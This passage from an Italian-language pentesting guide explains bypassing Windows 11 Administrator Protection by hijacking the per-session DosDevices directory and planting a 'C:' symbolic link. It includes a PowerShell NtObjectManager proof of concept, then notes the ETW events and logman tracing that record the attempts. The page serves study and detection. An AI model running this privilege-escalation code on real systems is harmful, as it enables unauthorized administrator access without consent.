Windows 11 25H2 “Administrator Protection” utilizza shadow-admin token con mappe `\Sessions\0\DosDevices/<LUID>` per sessione. La directory viene creata lazy da `SeGetTokenDeviceMap` alla prima risoluzione di `\??`. Se l'attaccante effettua l'impersonation dello shadow-admin token solo a livello **SecurityIdentification**, la directory viene creata con l'attaccante come **owner** (eredita `CREATOR OWNER`), consentendo link alle lettere delle unità che hanno precedenza su `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Passaggi:**

1. Da una sessione con privilegi ridotti, chiama `RAiProcessRunOnce` per avviare un `runonce.exe` shadow-admin senza prompt.
2. Duplica il suo primary token in un token di tipo **identification** ed effettua l'impersonation mentre apri `\??` per forzare la creazione di `\Sessions\0\DosDevices/<LUID>` con l'attaccante come owner.
3. Crea lì un symlink `C:` che punti a uno storage controllato dall'attaccante; i successivi accessi al filesystem in quella sessione risolveranno `C:` nel percorso dell'attaccante, consentendo un DLL/file hijack senza prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
Sugli host in anteprima, Administrator Protection registra approvazioni e errori come eventi ETW **15031** e **15032** nel provider `Microsoft-Windows-LUA`. Gli eventi includono il SID del richiedente, il percorso dell'applicazione, l'esito, l'account amministratore gestito e il metodo di autenticazione; pertanto, i tentativi ripetuti di exploit o i tentativi falliti di pilotare l'interfaccia utente non sono privi di telemetria.<sup>[[10]](#references)</sup>
```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Come funziona User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Raccolta di tecniche per bypassare UAC](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Scanner di compatibilità e launcher per bypassare UAC](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI adotta l'AI per generare backdoor PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: sfruttamento di una 0-Day contro obiettivi governativi del Sud-est asiatico](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Bypassing Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Bypass UAC utilizzando il task SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – Bypass di UnifiedConsent, TabTip e Narrator Always Notify](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Protezione dell'amministratore](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – Chiamare server RPC Windows locali da .NET](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte migliora CoolClient con un rootkit del kernel Windows firmato](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
{{#include ../../banners/hacktricks-training.md}}
